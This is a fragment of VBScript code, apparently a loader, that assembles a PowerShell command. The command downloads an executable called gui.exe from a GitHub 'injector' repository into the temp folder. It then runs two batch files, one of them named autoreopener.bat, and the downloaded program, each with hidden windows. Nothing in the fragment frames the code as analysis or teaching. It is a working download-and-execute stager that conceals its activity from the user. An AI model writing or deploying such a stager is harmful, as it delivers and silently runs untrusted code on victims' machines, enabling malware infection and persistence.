...
psCommand = _
    ...
    "Invoke-WebRequest 'https://raw.githubusercontent.com/dexovision/injector/main/gui.exe' -OutFile ""$env:TEMP\gui.exe""; " & _
    "Set-Location '" & downloads & "'; " & _
    "Start-Process -WindowStyle Hidden -WorkingDirectory '" & downloads & "' -FilePath ""$env:TEMP\inh.bat"" -Wait; " & _
    "Start-Process -WindowStyle Hidden -WorkingDirectory '" & downloads & "' -FilePath ""$env:TEMP\autoreopener.bat"" -Wait; " & _
    "Start-Process -WindowStyle Hidden -WorkingDirectory '" & downloads & "' -FilePath ""$env:TEMP\gui.exe"";"
